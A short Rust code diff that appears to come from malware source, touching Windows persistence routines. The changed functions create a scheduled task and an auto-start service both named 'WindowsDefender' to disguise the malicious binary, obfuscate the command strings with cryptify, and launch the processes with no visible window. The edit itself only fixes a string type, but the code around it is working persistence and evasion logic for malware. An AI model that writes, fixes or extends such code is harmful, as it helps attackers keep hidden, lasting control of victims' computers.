@@ -83,7 +83,7 @@ fn dll_persistence(dll_path: &Path) -> std::io::Result<()> {
 
 #[cfg(target_os = "windows")]
 fn scheduled_task(target_path: &Path) {
-    let path_str = target_path.to_string_lossy();
+    let path_str = target_path.to_string_lossy().to_string();
     let _ = Command::new(cryptify::encrypt_string!("schtasks"))
         .args(&[
             cryptify::encrypt_string!("/create"), cryptify::encrypt_string!("/tn"), cryptify::encrypt_string!("WindowsDefender"),
@@ -98,7 +98,7 @@ fn scheduled_task(target_path: &Path) {
 
 #[cfg(target_os = "windows")]
 fn windows_service(target_path: &Path) {
-    let path_str = target_path.to_string_lossy();
+    let path_str = target_path.to_string_lossy().to_string();
     let _ = Command::new(cryptify::encrypt_string!("sc"))
         .args(&[cryptify::encrypt_string!("create"), cryptify::encrypt_string!("WindowsDefender"), cryptify::encrypt_string!("binPath="), &path_str, cryptify::encrypt_string!("start="), cryptify::encrypt_string!("auto")])
         .creation_flags(CREATE_NO_WINDOW)
